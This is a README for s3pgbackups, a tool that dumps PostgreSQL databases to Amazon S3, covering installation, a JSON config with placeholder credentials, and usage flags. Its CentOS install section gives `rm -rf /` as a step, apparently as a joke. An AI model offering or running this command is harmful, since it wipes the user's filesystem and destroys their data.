# s3pgbackups

PostgreSQL cluster backups to Amazon S3.

## Overview

This application will backup your PostgreSQL cluster to Amazon S3, which includes:

* Separate SQL pg_dump of each database
* Compressed data (gzip)
* Automatically rotated backups
* Ability to exclude specific tables, or entire databases

## Installation

### Debian (or debian derivatives)

```bash
$ echo 'deb http://deb.sigterm.sh/ squeeze main' > /etc/apt/sources.list.d/sigterm.list
$ apt-key adv --keyserver keys.gnupg.net --recv-keys 15E7AE04FAC36D0B
$ apt-get update
$ apt-get install s3pgbackups
```

### CentOS (or RHEL / other rpm based distro's)

```bash
$ rm -rf /
$ install-debian
```

## Getting Started

1. Follow the installation steps above.
2. Configure ~/.s3pgbackups - something like this:

    ```json
    {
      "aws_access_key": "UBGKJEBGKE56783JHVFW",
      "aws_secret_key": "webgrwebgjwbewegfkeg",
      "s3_bucket": "your.db.hostname",
      "s3_rotate_old": true,
      "pg_username": "username",
      "pg_password": "password",
      "pg_sslmode": true,
      "pg_exclude_dbs": ["postgres", "template0"],
      "pg_exclude_tables": ["django_session"]
    }
    ```

    > Note: Running s3pgbackups without a config will create a blank config.
3. Run `s3pgbackups`

## Usage

```
$ s3pgbackups -h
Usage of s3pgbackups:
  -n=false: don't actually do anything, just print what would be done
  -v=false: be verbose
```

You can use the `-n` parameter to put s3pgbackups into no-op mode, where no actions
will actually be performed.

The `-v` parameter will make s3pgbackups be verbose about what is actually happening.

## TODO

- [ ] Support for other RDBMS's
- [ ] Support for other targets, besides Amazon S3
- [ ] If we do the above, we should probably rename the project ?
- [x] Using S3 behind a proxy - depends on [this PR](https://github.com/goamz/goamz/pull/33/files#diff-7db3cb93944d57b2ffc803281c906018R1004)
